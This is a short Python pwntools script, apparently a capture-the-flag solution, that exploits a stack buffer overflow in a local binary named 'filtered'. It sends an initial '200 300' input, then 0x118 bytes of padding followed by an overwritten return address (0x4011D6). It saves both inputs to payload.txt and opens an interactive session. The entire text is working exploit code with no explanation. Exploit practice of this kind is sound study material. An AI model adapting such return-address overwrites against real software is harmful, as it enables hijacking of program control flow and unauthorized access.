from pwn import *

binary = context.binary = ELF('./filtered')

payload0 = B'200 300'
payload = b'A'*(0x110+8)

payload += p64(0x4011D6)

p = process('./filtered')
p.sendline(payload0)
p.sendline(payload)
f = open('payload.txt', 'wb')
f.write(payload0+b'\n')
f.write(payload)
f.close()
p.interactive()
